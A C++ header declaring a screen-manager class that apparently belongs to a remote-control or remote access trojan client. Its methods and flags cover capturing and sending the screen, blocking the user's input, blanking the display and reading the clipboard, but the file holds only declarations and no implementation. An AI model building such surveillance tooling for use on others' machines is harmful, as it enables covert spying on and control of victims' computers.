// MyScreenManager.h: interface for the CMyScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MyScreenManager_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_)
#define AFX_MyScreenManager_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
#include "MyScreenSpy.h"

class CMyScreenManager : public CManager  
{
public:
	CMyScreenManager(CClientSocket *pClient);
	virtual ~CMyScreenManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	bool IsConnect();
	int	GetCurrentPixelBits();
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;
	BOOL m_bIsBlankScreen;
private:
	BYTE	m_bAlgorithm;
	bool	m_bIsCaptureLayer;
	int	m_biBitCount;
	HANDLE	m_hWorkThread, m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CMyScreenSpy	*m_pMyScreenSpy;
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	ControlThread(LPVOID lparam);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
};

#endif // !defined(AFX_MyScreenManager_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_)
